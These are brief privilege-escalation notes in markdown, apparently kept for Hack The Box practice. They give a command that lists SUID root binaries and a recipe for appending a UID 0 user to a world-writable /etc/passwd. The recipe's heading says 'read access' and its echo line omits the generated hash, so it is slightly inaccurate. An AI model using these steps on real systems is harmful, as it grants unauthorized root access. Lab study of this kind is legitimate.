# Privesc

# Look for suid binaries

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

## Privesc method when have read access to /etc/passwd

Probably never happends but document it just in case as I just experienced this on htb machine

```sh
root@bank:~# ls -l /etc/passwd
-rw-rw-rw- 1 root root 1356 May  1 22:31 /etc/passwd
openssl passwd -1 -salt xyz \<password\>
echo "username:\$xyz\$\<password\>:0:0:toor,,,:/root:/bin/bash" >> /etc/passwd
```
